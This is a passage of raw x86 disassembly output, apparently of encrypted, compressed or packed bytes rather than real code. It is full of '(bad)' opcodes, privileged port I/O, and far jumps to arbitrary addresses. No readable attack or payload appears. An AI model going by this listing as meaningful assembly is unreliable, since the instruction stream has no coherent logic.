  410571:	adc    DWORD PTR [ebp-0x350c15cc],esp
  410577:	hlt    
  410578:	imul   ecx,esi,0x54
  41057b:	stc    
  41057c:	loope  0x410545
  41057e:	add    eax,0xcd0ae1c1
  410583:	fstp   DWORD PTR [bp+di-0x67]
  410587:	(bad)  
  410588:	inc    esp
  410589:	fcmovnu st,st(1)
  41058b:	jbe    0x4105ba
  41058d:	outs   dx,BYTE PTR ds:[esi]
  41058e:	imul   ecx,DWORD PTR ds:0x375112ab,0x504a7eb0
  410598:	inc    esi
  410599:	into   
  41059a:	cs mov dh,0x3a
  41059d:	out    dx,eax
  41059e:	call   0xe2a5:0x79be2d6e
  4105a5:	pop    eax
  4105a6:	pusha  
  4105a7:	jmp    0x410610
  4105a9:	xor    edi,DWORD PTR [edi-0x3c40b8d2]
  4105af:	mov    edi,0xbdbb82b7
  4105b4:	and    BYTE PTR [esi-0x3e],bh
  4105b7:	and    BYTE PTR ds:0xfb52168d,al
  4105bd:	jno    0x410544
  4105bf:	cmp    eax,0x86e53dd0
  4105c4:	imul   edx,DWORD PTR [edi-0x2252a83c],0x65
  4105cb:	add    al,0xa8
  4105cd:	aaa    
  4105ce:	mov    cl,0x11
  4105d0:	lods   eax,DWORD PTR ds:[esi]
  4105d1:	mov    cl,0x5a
  4105d3:	cmp    dl,BYTE PTR ss:[esi-0x33]
  4105d7:	aaa    
  4105d8:	fbstp  TBYTE PTR [edi+0xd3307b7]
  4105de:	jns    0x410652
  4105e0:	imul   eax,DWORD PTR [esi],0xffffffd5
  4105e3:	inc    ecx
  4105e4:	aad    0xb3
  4105e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105e7:	js     0x410596
  4105e9:	mul    DWORD PTR [edi-0x19a8734a]
  4105ef:	add    ch,bl
  4105f1:	mov    ds:0x97572a06,al
  4105f6:	sub    DWORD PTR [esi+ecx*1+0x33],ebp
  4105fa:	mov    eax,DWORD PTR [ecx+0x73449885]
  410600:	pop    eax
  410601:	inc    esi
  410602:	ins    BYTE PTR es:[edi],dx
  410603:	jae    0x41060a
  410605:	jnp    0x4105a8
  410607:	sbb    DWORD PTR [ecx+0x64f8d059],edx
  41060d:	sub    ebx,ebp
  41060f:	cmp    al,0xe0
  410611:	xor    dl,BYTE PTR [ebp-0x2c]
  410614:	aam    0x2f
  410616:	dec    ebp
  410617:	inc    esi
  410618:	cli    
  410619:	mov    BYTE PTR [ebp+0x6781934f],al
  41061f:	gs (bad) 
  410621:	dec    edx
  410622:	xchg   edx,eax
  410623:	xcrypt-cbc (bad)
  410624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410625:	shl    esi,1
  410627:	push   edi
  410628:	jns    0x4105cc
  41062a:	dec    esp
  41062b:	inc    edx
  41062c:	ja     0x4105bd
  41062e:	xchg   ebx,eax
  41062f:	mov    edx,0x3a6197ac
  410634:	cmp    BYTE PTR [ecx-0x4e],0xc7
  410638:	inc    edi
  410639:	pusha  
  41063a:	cmp    BYTE PTR [ebp+0x1a],cl
  41063d:	ins    DWORD PTR es:[edi],dx
  41063e:	sub    DWORD PTR [ebx+0x3a],ebx
  410641:	inc    ebp
  410642:	dec    ebx
  410643:	add    al,0x5
  410645:	(bad)  
  410646:	ret    0xf9f7
  410649:	adc    edi,DWORD PTR [ebx-0x1176c77f]
  41064f:	nop    esp
  410652:	(bad)  
  410653:	fstp   DWORD PTR [eax+0xfec01ce]
  410659:	(bad)  
  41065a:	and    eax,0x326429e9
  41065f:	mov    eax,ds:0x78af9528
  410664:	xchg   esi,eax
  410665:	(bad)  
  410667:	cli    
  410668:	shl    BYTE PTR [eax-0x38],0x27
  41066c:	hlt    
  41066d:	hlt    
  41066e:	add    al,0x97
  410670:	rol    bl,1
  410672:	xor    al,0x97
  410674:	add    al,0x71
  410676:	dec    eax
  410677:	mov    ?,WORD PTR [eax-0x5f]
  41067a:	cmc    
  41067b:	dec    ebp
  41067c:	imul   edx,DWORD PTR [esi],0xab226037
  410682:	in     al,0x49
  410684:	outs   dx,BYTE PTR ds:[esi]
  410685:	xor    al,0xbb
  410687:	shl    DWORD PTR [ecx+edx*8+0x23924480],1
  41068e:	xchg   ebx,eax
  41068f:	outs   dx,DWORD PTR ds:[esi]
  410690:	je     0x410668
  410692:	in     eax,0x74
  410694:	in     al,0xd9
  410696:	and    ch,BYTE PTR [ebp+0x9da373c]
  41069c:	sar    DWORD PTR [ebx-0x2641d89f],1
  4106a2:	or     al,0xd9
  4106a4:	ret    
  4106a5:	out    0x7d,al
  4106a7:	in     eax,0xd2
  4106a9:	xchg   ebp,eax
  4106aa:	outs   dx,BYTE PTR ds:[esi]
  4106ab:	aad    0x82
  4106ad:	call   0x4583:0x480eae4
  4106b4:	sbb    DWORD PTR [edx+0x835681],0x57e3d68e
  4106be:	rol    esp,0x5e
  4106c1:	adc    ebx,esp
  4106c3:	mov    cl,0xc5
  4106c5:	lock or al,0xd4
  4106c8:	not    BYTE PTR [ebx]
  4106ca:	push   ss
  4106cb:	inc    ebp
  4106cc:	sub    ebx,DWORD PTR [ebx-0x1acb02f]
  4106d2:	cld    
  4106d3:	mov    BYTE PTR [ebx+0x4a],bl
  4106d6:	addr16 lock inc ecx
  4106d9:	out    0x47,eax
  4106db:	std    
  4106dc:	imul   ebp,DWORD PTR [edi],0x9dc93438
  4106e2:	adc    eax,0x5f735d8a
  4106e7:	and    al,0x1f
  4106e9:	retf   0x204
  4106ec:	jmp    0x41074f
  4106ee:	ja     0x410719
  4106f0:	sub    DWORD PTR [ebx],ecx
  4106f2:	adc    DWORD PTR [eax-0x5e],edi
  4106f5:	clc    
  4106f6:	xchg   BYTE PTR [edx],ah
  4106f8:	retf   
  4106f9:	shl    DWORD PTR [esi],cl
  4106fb:	imul   BYTE PTR [ebp+0x4cac7ddc]
  410701:	sbb    edx,ebx
  410703:	pop    edi
  410704:	push   ss
  410705:	stos   DWORD PTR es:[edi],eax
  410706:	fld    TBYTE PTR [esi-0x2b8f90c5]
  41070c:	or     ecx,0xffffffb1
  41070f:	mov    dh,0xae
  410711:	outs   dx,BYTE PTR ds:[esi]
  410712:	xlat   BYTE PTR ds:[ebx]
  410713:	mov    esp,0x48dd4c57
  410718:	outs   dx,BYTE PTR ds:[esi]
  410719:	(bad)  
  41071a:	(bad)  
  41071b:	fdivr  DWORD PTR [ebx+0x3b7f837c]
  410721:	inc    ecx
  410722:	push   eax
  410723:	call   0x6be9:0xdd204047
  41072a:	fadd   st(1),st
  41072c:	dec    edi
  41072d:	sub    al,0xa
  41072f:	xchg   ebp,eax
  410730:	lock sub DWORD PTR [ebx],ecx
  410733:	cmp    dh,BYTE PTR [esi+0x56]
  410736:	outs   dx,DWORD PTR ds:[esi]
  410737:	sub    edx,DWORD PTR [esi-0x46c2ff14]
  41073d:	imul   ecx,DWORD PTR [ebp+esi*1-0x6374a012],0x5fe64d3a
  410748:	cmovp  ebp,DWORD PTR [ecx-0x19fe635d]
  41074f:	icebp  
  410750:	fs push 0x2abcb65d
  410756:	retf   0xb31
  410759:	jb     0x4106fd
  41075b:	and    al,bl
  41075d:	in     eax,dx
  41075e:	push   0x16
  410760:	or     BYTE PTR [esi+eax*1-0x74],cl
  410764:	lock stos DWORD PTR es:[edi],eax
  410766:	mov    dl,0xc4
  410768:	bswap  edx
  41076a:	jmp    0x4107df
  41076c:	push   es
  41076d:	test   BYTE PTR [eax-0x18],0x10
  410771:	test   DWORD PTR [edi+0x1],ecx
  410774:	rcr    DWORD PTR [ecx+0x303c826c],1
  41077a:	push   ecx
  41077b:	push   0xffffffa7
  41077d:	xchg   esi,eax
  41077e:	mov    ds:0xd6676396,eax
  410783:	push   edx
  410784:	adc    DWORD PTR ds:0xcff2e0a0,0x1b6e478e
  41078e:	sbb    ebx,esi
  410790:	(bad)  
  410791:	adc    edx,DWORD PTR [ecx+0x163dde21]
  410797:	pop    edi
  410798:	clc    
  410799:	mov    eax,ds:0x67e4e813
  41079e:	pop    eax
  41079f:	pop    eax
  4107a0:	(bad)  [esi+0x2036af8f]
  4107a6:	push   esp
  4107a7:	les    esi,FWORD PTR [edi]
  4107a9:	inc    ebx
  4107aa:	in     al,0xc9
  4107ac:	(bad)  
  4107af:	int3   
  4107b0:	mov    ebp,0x32471c47
  4107b5:	xchg   esp,eax
  4107b6:	sti    
  4107b7:	in     al,0xf2
  4107b9:	loope  0x4107c3
  4107bb:	jmp    0x410803
  4107bd:	mov    eax,0x3efb84f7
  4107c2:	jge    0x41081f
  4107c4:	jg     0xdd736377
  4107ca:	dec    eax
  4107cb:	lock fidivr WORD PTR [edi]
  4107ce:	mov    ecx,0xfb55df7e
  4107d3:	push   ebp
  4107d4:	gs pop ss
  4107d6:	xor    cl,BYTE PTR [esp+ecx*1+0x37]
  4107da:	push   eax
  4107db:	xchg   edx,eax
  4107dc:	add    DWORD PTR [ebp+0x635fb104],ebx
  4107e2:	or     bl,BYTE PTR [eax+0x18]
  4107e5:	dec    eax
  4107e6:	dec    edi
  4107e7:	leave  
  4107e8:	ins    DWORD PTR es:[edi],dx
  4107e9:	out    0x1c,al
  4107eb:	fwait
  4107ec:	xor    eax,esi
  4107ee:	scas   al,BYTE PTR es:[edi]
  4107ef:	sbb    al,0x87
  4107f1:	call   FWORD PTR [esi]
  4107f3:	xchg   esp,eax
  4107f4:	jmp    0x70e63946
  4107f9:	lahf   
  4107fa:	out    dx,al
  4107fb:	out    0xad,al
  4107fd:	mov    BYTE PTR [esi+0x1aa23994],ch
  410803:	jbe    0x4107d0
  410805:	bound  esp,QWORD PTR [ecx-0x35a5bcac]
  41080b:	and    al,0xd6
  41080d:	adc    DWORD PTR [eax+0x3f4cd50d],eax
  410813:	iret   
  410814:	sar    ecx,1
  410816:	data16 out 0xdf,al
  410819:	sbb    dl,ch
  41081b:	mov    al,0xf9
  41081d:	aam    0x46
  41081f:	aad    0x1e
  410821:	and    al,0xf9
  410823:	sbb    eax,0x155b455e
  410828:	inc    edi
  410829:	inc    esi
  41082b:	inc    edx
  41082c:	push   esp
  41082d:	int    0x57
  41082f:	mov    al,0xda
  410831:	retf   
  410832:	mov    BYTE PTR [ecx+0x68],bl
  410835:	cmp    DWORD PTR [esi],edi
  410837:	loop   0x4107d1
  410839:	mov    ecx,0x66a00d61
  41083e:	mov    dh,cl
  410840:	sub    al,0x46
  410842:	mov    bh,0x88
  410844:	adc    DWORD PTR gs:[eax-0x41bbd493],edi
  41084b:	adc    BYTE PTR [ebp-0x28b7f407],0xa5
  410852:	dec    edx
  410853:	shl    BYTE PTR [edx-0x6e2148fd],1
  410859:	sbb    DWORD PTR [ebx+0x58],ecx
  41085c:	lds    esp,FWORD PTR [eax-0x3050cf08]
  410862:	or     dh,bh
  410864:	loop   0x4107fa
  410866:	in     eax,dx
  410867:	jp     0x4107f3
  410869:	inc    esi
  41086a:	loope  0x410878
  41086c:	scas   eax,DWORD PTR es:[edi]
  41086d:	sbb    al,0x72
  41086f:	dec    ecx
  410870:	inc    ecx
  410871:	pop    edi
  410872:	fldcw  WORD PTR [esi-0x56ac21b1]
  410878:	ret    
  410879:	cdq    
  41087a:	fcmovne st,st(1)
  41087c:	outs   dx,DWORD PTR ds:[esi]
  41087d:	adc    al,0xc4
  41087f:	mov    al,0x85
  410881:	jae    0x41084e
  410883:	adc    al,BYTE PTR [esi]
  410885:	gs icebp 
  410887:	inc    ecx
  410888:	stos   BYTE PTR es:[edi],al
  410889:	nop
  41088a:	pop    eax
  41088b:	xchg   edi,eax
  41088c:	(bad)  
  41088d:	sti    
  41088e:	dec    ebx
  41088f:	in     al,0xc7
  410891:	cli    
  410892:	pop    esi
  410893:	jge    0x41087c
  410895:	jae    0x4108a6
  410897:	int    0x62
  410899:	mov    al,0xdc
  41089b:	pop    ebx
  41089c:	in     eax,dx
  41089d:	sub    bl,BYTE PTR [edi]
  41089f:	dec    ebx
  4108a0:	adc    DWORD PTR [edi+0x60a94e10],eax
  4108a6:	fidivr DWORD PTR [eax]
  4108a8:	xchg   DWORD PTR [esi],eax
  4108aa:	add    al,0x19
  4108ac:	and    BYTE PTR [edi],dh
  4108ae:	xor    eax,DWORD PTR [ebx+edx*8+0x25e05e6c]
  4108b5:	sti    
  4108b6:	inc    eax
  4108b7:	inc    edx
  4108b8:	out    0x49,al
  4108ba:	mov    ebx,DWORD PTR [ebx-0x47]
  4108bd:	mov    BYTE PTR [edx+0x3468df0f],bl
  4108c3:	out    dx,eax
  4108c4:	test   BYTE PTR [esp+ecx*1+0x1e],0x60
  4108c9:	mov    ch,0x11
  4108cb:	dec    ecx
  4108cc:	cs in  al,0x7e
  4108cf:	pop    ebp
  4108d0:	outs   dx,DWORD PTR ds:[esi]
  4108d1:	pop    esi
  4108d2:	add    BYTE PTR [edi+0x51625295],dh
  4108d8:	push   es
  4108d9:	ds pop ebx
  4108db:	sar    ebp,0x5
  4108de:	xchg   ebp,eax
  4108df:	mov    ebx,0xc62514d7
  4108e4:	sbb    al,0xdd
  4108e6:	dec    eax
  4108e7:	xchg   edx,eax
  4108e8:	into   
  4108e9:	dec    edx
  4108ea:	call   0x91c446a6
  4108ef:	pop    edi
  4108f0:	sbb    eax,0x30e1e8be
  4108f5:	mov    ds:0xa6c4b8e5,al
  4108fa:	pusha  
  4108fb:	mov    ds:0xcc3bba90,al
  410900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410901:	xchg   edi,eax
  410902:	xor    al,0x4a
  410904:	push   eax
  410905:	in     eax,dx
  410906:	jae    0x410907
  410908:	ficom  WORD PTR [eax+0x4f]
  41090b:	push   ds
  41090c:	mov    cl,0xbc
  41090e:	xor    DWORD PTR [ebx+0x49],edx
  410911:	push   0x5e
  410913:	int3   
  410914:	jecxz  0x41091b
  410916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410917:	or     eax,0x21c64c54
  41091c:	xor    bh,BYTE PTR [edx]
  41091e:	xor    ebx,DWORD PTR [eax-0x10]
  410921:	dec    ebp
  410922:	retf   0x40c6
  410925:	adc    al,0xef
  410927:	mov    ecx,fs
  410929:	iret   
  41092a:	iret   
  41092b:	iret   
  41092c:	and    eax,0xc7d8dda0
  410931:	ins    DWORD PTR es:[edi],dx
  410932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410933:	jnp    0x410974
  410935:	mov    bh,BYTE PTR [ebp+0x5a]
  410938:	sahf   
  410939:	repnz add ebp,edi
  41093c:	das    
  41093d:	inc    ebp
  41093e:	adc    DWORD PTR [edi],ecx
  410940:	sti    
  410941:	into   
  410942:	test   DWORD PTR [ecx+0x1b034a16],0xba13c1f4
  41094c:	push   edx
  41094d:	addr16 loop 0x4108ff
  410950:	call   0x267b1479
  410955:	mov    ecx,0xb436d00b
  41095a:	mov    eax,0x38b8fbf7
  41095f:	mov    ah,0xaa
  410961:	xchg   esp,eax
  410962:	outs   dx,DWORD PTR ds:[esi]
  410963:	inc    edx
  410964:	push   eax
  410965:	or     ecx,ebp
  410967:	in     eax,0x22
  410969:	xor    DWORD PTR [ecx+0x16bf9eb1],esp
  41096f:	fisttp WORD PTR [ebp+0x54]
  410972:	dec    esi
  410973:	pop    ebp
  410974:	add    eax,0x5f7a800e
  410979:	adc    edx,DWORD PTR [edx-0x47]
  41097c:	inc    edx
  41097d:	xor    eax,0x915547ef
  410982:	cs out dx,al
  410984:	das    
  410985:	mov    al,BYTE PTR es:[edx-0x77]
  410989:	push   ecx
  41098a:	jnp    0x4109ac
  41098c:	sbb    cl,BYTE PTR ss:[edi-0x31e7816]
  410993:	call   0xabfafd3a
  410998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410999:	(bad)  
  41099a:	call   0xf1c99c73
  41099f:	mov    eax,ds:0xbc4ce6e0
  4109a4:	mov    fs,WORD PTR [esi+0x3e6f0511]
  4109aa:	div    DWORD PTR [eax-0x2]
  4109ad:	lods   eax,DWORD PTR ds:[esi]
  4109ae:	inc    ebp
  4109af:	add    edi,ebp
  4109b1:	xor    BYTE PTR [eax+0x17],cl
  4109b4:	stc    
  4109b5:	cmp    eax,eax
  4109b7:	loop   0x410a35
  4109b9:	push   cs
  4109ba:	sbb    eax,0x90dfbb6c
  4109bf:	jae    0x410945
  4109c1:	pop    edi
  4109c2:	pusha  
  4109c3:	sub    al,0x9
  4109c5:	jmp    0x7ceb2f6
  4109ca:	and    al,0xef
  4109cc:	repnz jecxz 0x4109df
  4109cf:	mov    esp,0xd8903d04
  4109d4:	mov    esp,0x6a1a67a1
  4109d9:	jo     0x410a17
  4109db:	pop    es
  4109dc:	(bad)  
  4109dd:	mov    al,ds:0xaabe2f95
  4109e2:	sub    eax,0x38b3c8f6
  4109e7:	dec    edi
  4109e8:	mov    fs,WORD PTR [esi-0x39f31317]
  4109ee:	mov    ah,0xa1
  4109f0:	cdq    
  4109f1:	mov    eax,ds:0xb21b7f4a
  4109f6:	lods   eax,DWORD PTR ds:[esi]
  4109f7:	(bad)  
  4109f8:	mov    al,ds:0xdf36fb44
  4109fd:	or     cl,BYTE PTR [edx-0x1e]
  410a00:	jle    0x4109b0
  410a02:	push   esi
  410a03:	ror    DWORD PTR [esi+edx*4+0x4416e120],0x34
  410a0b:	xchg   esp,eax
  410a0c:	push   ss
  410a0d:	sub    ebp,DWORD PTR [ecx]
  410a0f:	adc    eax,0x40a9d8a9
  410a14:	sub    edx,DWORD PTR [eax]
  410a16:	or     ebx,esi
  410a18:	jns    0x4109c0
  410a1a:	leave  
  410a1b:	and    BYTE PTR [edi-0x6176a2ca],bh
  410a21:	sar    ebp,1
  410a23:	xchg   ebp,eax
  410a24:	fstp   DWORD PTR [esi+0x50e6e898]
  410a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a2b:	outs   dx,BYTE PTR ds:[esi]
  410a2c:	pop    esp
  410a2d:	popf   
  410a2e:	push   esp
  410a2f:	or     al,cl
  410a31:	or     al,0xc0
  410a33:	adc    BYTE PTR [edx-0x122f971c],0xae
  410a3a:	ficomp DWORD PTR [edx]
  410a3c:	sbb    al,0x35
  410a3e:	dec    eax
  410a3f:	ins    DWORD PTR es:[edi],dx
  410a40:	lock mov edx,0xd8221622
  410a46:	sub    bl,BYTE PTR [edx-0x6d03870b]
  410a4c:	pop    ebp
  410a4d:	adc    bh,BYTE PTR [edx-0x396e6b33]
  410a53:	cwde   
  410a54:	ret    0x1e6a
  410a57:	xchg   esp,eax
  410a58:	stc    
  410a59:	call   FWORD PTR [esi]
  410a5b:	fwait
  410a5c:	pop    esi
  410a5d:	idiv   esi
  410a5f:	addr16 dec ebx
  410a61:	lods   al,BYTE PTR ds:[esi]
  410a62:	in     eax,dx
  410a63:	sti    
  410a64:	and    BYTE PTR [esi-0x18f1af61],bl
  410a6a:	bound  esi,QWORD PTR [edx]
  410a6c:	jmp    0x410a38
  410a6e:	cmp    dl,bl
  410a70:	or     eax,0xe8fed289
  410a75:	in     eax,dx
  410a76:	frstor [esi+0x30f2cffb]
  410a7c:	xchg   esi,eax
  410a7d:	call   0x878a:0x60389362
  410a84:	test   eax,0xd918d8e0
  410a89:	mov    DWORD PTR [ebx+0x95d7e05],ecx
  410a8f:	and    al,0x48
  410a91:	adc    eax,0xdb459387
  410a97:	push   0xe
  410a99:	mov    ebp,0xa76e727d
  410a9e:	cmp    BYTE PTR [ebx-0x25],cl
  410aa1:	mov    edx,0x786e38d2
  410aa6:	adc    eax,0xaa8d3e1d
  410aab:	sbb    BYTE PTR [edx-0x79a8ac22],cl
  410ab1:	push   ebx
  410ab2:	iret   
  410ab3:	mov    al,0xe7
  410ab5:	sub    esi,ebp
  410ab7:	jmp    0x410a46
  410ab9:	push   esp
  410aba:	xlat   BYTE PTR ds:[ebx]
  410abb:	int    0xd3
  410abd:	inc    eax
  410abe:	lea    eax,[ebx]
  410ac0:	out    0x84,al
  410ac2:	push   ss
  410ac3:	jp     0x410a75
  410ac5:	ficomp DWORD PTR [ebx]
  410ac7:	ss or  esi,eax
  410aca:	mov    ecx,0x70fba699
  410acf:	mov    ebx,0x87d35bef
  410ad4:	sbb    BYTE PTR [esi*8+0x18c92e70],bh
  410adb:	aaa    
  410adc:	mov    eax,ds:0xe82f5a9c
  410ae1:	inc    DWORD PTR [ecx]
  410ae3:	and    eax,0x9223b2e7
  410ae8:	push   esp
  410ae9:	dec    ecx
  410aea:	mov    ?,WORD PTR [ebx-0x1f40d240]
  410af0:	adc    DWORD PTR es:0xab50ad2a,esi
  410af7:	and    edx,DWORD PTR [esi-0x14]
  410afa:	sub    BYTE PTR [ecx-0x77],al
  410afd:	xchg   esi,eax
  410afe:	ret    
  410aff:	in     al,dx
  410b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b01:	ins    DWORD PTR es:[edi],dx
  410b02:	das    
  410b03:	add    al,0x9b
  410b05:	pop    es
  410b06:	fisttp QWORD PTR [esi-0x2053d062]
  410b0c:	int3   
  410b0d:	mov    cl,0x3e
  410b0f:	push   esp
  410b10:	jns    0x410b2d
  410b12:	pop    edx
  410b13:	mov    ah,0xd5
  410b15:	ret    
  410b16:	out    0x50,eax
  410b18:	jb     0x410aaa
  410b1a:	stos   BYTE PTR es:[edi],al
  410b1b:	add    al,0xd0
  410b1d:	mov    esp,DWORD PTR [edx+0x6]
  410b20:	fcom   DWORD PTR [ecx+0x75808219]
  410b26:	and    bh,BYTE PTR [ebp+0x3d]
  410b29:	jno    0x410b6f
  410b2b:	cmp    eax,0x52831b50
  410b30:	(bad)  
  410b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b33:	ins    BYTE PTR es:[edi],dx
  410b34:	adc    edi,DWORD PTR [esi]
  410b36:	inc    esp
  410b37:	int3   
  410b38:	sub    eax,0xbaf0476
  410b3d:	xchg   ebx,eax
  410b3e:	cmp    al,0xb
  410b40:	fisttp WORD PTR ds:0x7841ba21
  410b46:	dec    ebp
  410b47:	jp     0x410b33
  410b49:	imul   esp,DWORD PTR [ebp+0x32],0xffffff93
  410b4d:	iret   
  410b4e:	lods   eax,DWORD PTR ds:[esi]
  410b4f:	adc    bl,BYTE PTR [ebp-0x22]
  410b52:	jmp    0x2dfd:0xf655f274
  410b59:	or     ebx,DWORD PTR [eax+eiz*8-0x5d9abcd3]
  410b60:	cmc    
  410b61:	mov    ss,WORD PTR [esi]
  410b63:	mov    ds:0x3024e56b,eax
  410b68:	sub    eax,0x1be72950
  410b6d:	das    
  410b6e:	shl    bh,cl
  410b70:	mov    ch,0xa7
  410b72:	inc    ecx
  410b73:	stos   DWORD PTR es:[edi],eax
  410b74:	test   edi,edx
  410b76:	fld    TBYTE PTR [ebp+0x4166543f]
  410b7c:	push   0xe8718535
  410b81:	mov    ebp,0xfb27c0d7
  410b86:	or     eax,0x51bff4c
  410b8b:	cdq    
  410b8c:	out    0xfc,al
  410b8e:	les    ebp,FWORD PTR [esi-0x35fbf1b2]
  410b94:	jp     0x410b4c
  410b96:	ins    BYTE PTR es:[edi],dx
  410b97:	stc    
  410b98:	lods   eax,DWORD PTR ds:[esi]
  410b99:	push   edx
  410b9a:	(bad)  
  410b9c:	or     bl,BYTE PTR ds:[edi]
  410b9f:	outs   dx,DWORD PTR ds:[esi]
  410ba0:	mov    ds:0x55d22d48,eax
  410ba5:	fisub  DWORD PTR [edx+0x44939616]
  410bab:	and    BYTE PTR [ebp-0x52],0x34
  410baf:	cld    
  410bb0:	xchg   ecx,eax
  410bb1:	or     dl,BYTE PTR [esi-0x46]
  410bb4:	jne    0x410b3e
  410bb6:	stos   DWORD PTR es:[edi],eax
  410bb7:	loopne 0x410b3b
  410bb9:	sub    bl,dh
  410bbb:	in     al,0x1b
  410bbd:	jbe    0x410b62
  410bbf:	test   BYTE PTR [edx-0x23],cl
  410bc2:	pop    eax
  410bc3:	mov    bh,0x84
  410bc5:	inc    eax
  410bc6:	xchg   ebx,eax
  410bc7:	aad    0x15
  410bc9:	outs   dx,DWORD PTR ds:[esi]
  410bca:	test   eax,0xfadb1d38
  410bcf:	cdq    
  410bd0:	(bad)  
  410bd1:	scas   eax,DWORD PTR es:[edi]
  410bd2:	lods   eax,DWORD PTR ds:[esi]
  410bd3:	push   ebx
  410bd5:	xchg   esi,eax
  410bd6:	push   edi
  410bd7:	jno    0x410c37
  410bd9:	pop    edx
  410bda:	jecxz  0x410c47
  410bdc:	dec    esi
  410bdd:	dec    eax
  410bde:	add    bh,BYTE PTR [esi-0x4c]
  410be1:	iret   
  410be2:	adc    BYTE PTR [esi+0x62],cl
  410be5:	pop    edi
  410be6:	mov    edi,0xe3d5ab29
  410beb:	push   es
  410bec:	sub    BYTE PTR [edi-0x4b],dh
  410bef:	jno    0x410b85
  410bf1:	sar    BYTE PTR [ebp+0x1d],cl
  410bf4:	and    BYTE PTR [eax-0x5e],cl
  410bf7:	idiv   DWORD PTR [ecx]
  410bf9:	push   0xbeebaded
  410bfe:	cmp    DWORD PTR [ecx-0x5d],edx
  410c01:	lods   al,BYTE PTR ds:[esi]
  410c02:	and    edx,DWORD PTR [edx]
  410c04:	mov    dl,0xe8
  410c06:	inc    ecx
  410c07:	arpl   WORD PTR [esi-0x65],bp
  410c0a:	ret    0x37ba
  410c0d:	call   0x7bd66a38
  410c12:	push   cs
  410c13:	repz fistp WORD PTR [edx+0x42]
  410c17:	repz (bad) 
  410c19:	out    0x14,al
  410c1b:	(bad)  
  410c1c:	ficom  WORD PTR [ebx+0x55924677]
  410c22:	ds sub eax,0x521e1f47
  410c28:	dec    esp
  410c29:	or     eax,0x47b68b69
  410c2e:	scas   al,BYTE PTR es:[edi]
  410c2f:	cs (bad) 
  410c31:	sbb    ah,BYTE PTR [edx+0x651b37e6]
  410c37:	jnp    0x410be3
  410c39:	loop   0x410bd3
  410c3b:	aam    0xae
  410c3d:	dec    ecx
  410c3e:	jne    0x410bfb
  410c40:	mov    ch,0x63
  410c42:	xor    cl,0x71
  410c45:	int    0xf0
  410c47:	dec    esp
  410c48:	(bad)  
  410c49:	cmp    BYTE PTR [edi+ebx*4+0x6e],ch
  410c4d:	adc    bl,BYTE PTR [eax-0x40]
  410c50:	push   ebp
  410c51:	les    ebx,FWORD PTR [ebp+0x53]
  410c54:	(bad)  
  410c55:	iret   
  410c56:	mov    es,edi
  410c58:	push   cs
  410c59:	jp     0x410c29
  410c5b:	add    dh,dh
  410c5d:	jmp    0x522ebf24
  410c62:	es je  0x410c19
  410c65:	xor    BYTE PTR ds:0x1452f5a2,0xef
  410c6c:	pop    ebx
  410c6d:	xchg   edx,eax
  410c6e:	test   DWORD PTR [ecx],edx
  410c70:	pushf  
  410c71:	push   cs
  410c72:	mov    cs,WORD PTR [ebx+ebp*8]
  410c75:	fadd   QWORD PTR [edi]
  410c77:	jo     0x410cd3
  410c79:	es adc eax,0x82f2fe9c
  410c7f:	xor    al,0x8d
  410c81:	and    al,0x53
  410c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c85:	or     DWORD PTR [eax],esp
  410c87:	sub    eax,0xa7c7564
  410c8c:	scas   eax,DWORD PTR es:[edi]
  410c8d:	cmp    dh,al
  410c8f:	xor    BYTE PTR [edi-0x67],0xe8
  410c93:	add    ebx,edi
  410c95:	dec    esp
  410c96:	addr16 push 0xfffffffa
  410c99:	dec    edi
  410c9a:	mov    dh,0x99
  410c9c:	frstor [ebx]
  410c9e:	sbb    ebx,DWORD PTR [edi-0x3b]
  410ca1:	test   al,0xf4
  410ca3:	or     al,BYTE PTR [ecx]
  410ca5:	dec    ecx
  410ca6:	in     eax,0xcb
  410ca8:	dec    ebx
  410ca9:	sub    DWORD PTR [esi+0x6b],edx
  410cac:	cmp    BYTE PTR [ebp+0x3],cl
  410caf:	gs inc edi
  410cb1:	dec    ebx
  410cb3:	pop    ecx
  410cb4:	cwde   
  410cb5:	pop    es
  410cb6:	in     al,0x3b
  410cb8:	addr16 cld 
  410cba:	mov    dl,0xa5
  410cbc:	sbb    al,0xfa
  410cbe:	hlt    
  410cbf:	inc    ebx
  410cc0:	xchg   edx,eax
  410cc1:	loope  0x410c4b
  410cc3:	cmp    al,bh
  410cc5:	hlt    
  410cc6:	mov    ecx,0xe140eaa4
  410ccb:	add    bl,BYTE PTR [esi-0x3cceaecc]
  410cd1:	daa    
  410cd2:	stc    
  410cd3:	das    
  410cd4:	xchg   edi,eax
  410cd5:	sti    
  410cd6:	dec    ecx
  410cd7:	das    
  410cd8:	jle    0x410d41
  410cda:	xchg   ecx,eax
  410cdb:	fisttp DWORD PTR ds:0x247eb915
  410ce1:	cs pop esi
  410ce3:	loope  0x410d48
  410ce5:	test   eax,0x7355cdbc
  410cea:	out    0x81,al
  410cec:	fimul  DWORD PTR es:[ebp-0xd7c57d6]
  410cf3:	pop    edx
  410cf4:	dec    ecx
  410cf5:	sub    eax,0xa0521fc9
  410cfa:	push   esp
  410cfb:	pop    ebp
  410cfc:	mov    cl,0x61
  410cfe:	xchg   DWORD PTR [esi+ecx*2+0x45],eax
  410d02:	arpl   WORD PTR [eax+eax*2-0x20],bp
  410d06:	mov    esi,DWORD PTR [ecx]
  410d08:	push   ss
  410d09:	and    DWORD PTR [ebp+0x79],edi
  410d0c:	icebp  
  410d0d:	ds push ebx
  410d0f:	retf   
  410d10:	leave  
  410d11:	clc    
  410d12:	mov    ah,0xb6
  410d14:	xchg   ecx,eax
  410d15:	leave  
  410d16:	dec    eax
  410d17:	mov    bh,0xeb
  410d19:	in     al,dx
  410d1a:	in     eax,0x42
  410d1c:	cmc    
  410d1d:	loopne 0x410d7b
  410d1f:	fstp   QWORD PTR [eax-0x154ce7a1]
  410d25:	push   ds
  410d26:	retf   0xbc1d
